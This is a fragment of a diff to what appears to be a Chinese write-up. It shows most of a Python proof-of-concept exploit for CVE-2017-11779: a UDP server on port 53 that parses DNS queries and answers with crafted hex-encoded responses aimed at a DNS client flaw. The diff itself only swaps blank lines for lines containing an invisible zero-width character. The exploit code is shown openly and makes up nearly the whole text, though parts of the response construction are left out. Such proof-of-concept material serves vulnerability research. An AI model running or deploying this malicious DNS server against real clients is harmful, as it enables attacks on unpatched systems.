@@ -158,7 +158,7 @@ PoC 如下，
 ```
 import SocketServer
 import sys
-
+​
 class Handler(SocketServer.BaseRequestHandler):
   def handle(self):
     socket = self.request[1]
@@ -176,7 +176,7 @@ class Handler(SocketServer.BaseRequestHandler):
     response += "0000290200000080000000".decode("hex")
     print(response.encode("hex"))
     socket.sendto(response, self.client_address)
-
+​
   def get_question(self, data):
     start_idx = 12
     end_idx = start_idx
@@ -187,7 +187,7 @@ class Handler(SocketServer.BaseRequestHandler):
       end_idx += 5
       num_questions -= 1
     return data[start_idx:end_idx]
-
+​
 if __name__ == "__main__":
   server = SocketServer.ThreadingUDPServer(("0.0.0.0", 53), Handler)
   print("CVE-2017-11779 PoC Started.")
